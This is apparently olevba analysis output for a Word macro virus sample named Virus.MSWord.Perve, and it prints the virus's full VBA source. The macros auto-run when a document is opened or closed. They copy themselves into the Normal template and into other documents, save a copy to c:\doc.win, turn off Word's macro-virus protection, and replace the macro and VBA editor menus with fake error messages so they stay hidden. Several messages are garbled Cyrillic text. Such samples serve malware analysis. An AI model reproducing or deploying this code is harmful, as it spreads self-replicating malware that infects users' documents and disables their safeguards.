olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Perve
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Perve - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ac.bas 
in file: ./Virus.MSWord.Perve - OLE stream: 'Macros/VBA/ac'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error GoTo ab
Call cf
sr = "c:\doc.win"
imacrocount = WordBasic.countmacros(1, 0, 0)
For i = 1 To imacrocount
zu$ = WordBasic.macroname$(i, 1)
If zu$ = "ao" Then GoTo ab
Next i
Application.OrganizerCopy sr, ActiveDocument, Name:="ac", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy sr, ActiveDocument, Name:="ao", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ab:
End Sub
Sub ToolsMacro()
MsgBox "Čçâčíčňĺ, íî íŕ ďčđŕňńęîé âĺđńčč ýňŕ ôóíęöč˙ íĺ đŕáîňŕĺň", vbCritical, "Îřčáęŕ"
End Sub
Sub ViewVBCode()
MsgBox "Îřčáęŕ â ńčńňĺěíîě đĺĺńňđĺ Windows!", vbCritical, "Error"
End Sub
Sub toolsOptions()
MsgBox "Âŕř ęîěďüţňĺđ ňĺďĺđü îáëŕäŕĺň óäčâčňĺëüíűě ńâîéńňâîě" + Chr$(13) + "-â í¸ě ĺńňü ĆČÇÍÜ!"
End Sub
'Âîň îí ěîé ďĺđâĺíĺö!
'Čě˙ ĺěó - 1313. Ďđîřó çŕďîěíčňü!!!
-------------------------------------------------------------------------------
VBA MACRO ao.bas 
in file: ./Virus.MSWord.Perve - OLE stream: 'Macros/VBA/ao'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
Attribute Autoopen.VB_Description = "Fuck"
Attribute Autoopen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.one"
On Error GoTo aT
im = WordBasic.countmacros(0, 0)
For i = 1 To im
If WordBasic.macroname$(i, 0, 0) = "ao" Then
    bI = -1
    End If
    Next i
    If Not bI Then
    sE$ = WordBasic.FileName$()
    mR$ = sE$ + ":ao"
    WordBasic.MacroCopy mR$, "Normal:ao", 1
   mR$ = sE$ + ":ac"
   WordBasic.MacroCopy mR$, "Normal:ac", 1
     End If
Call cf
aT:
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
  End With
End Sub
Sub cf()
On Error GoTo z
MF = Dir("c:\doc.win")
If MF = "doc.win" Then GoTo z
a = ActiveDocument.FullName
ActiveDocument.SaveAs "c:\doc.win"
ActiveDocument.SaveAs a
z:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

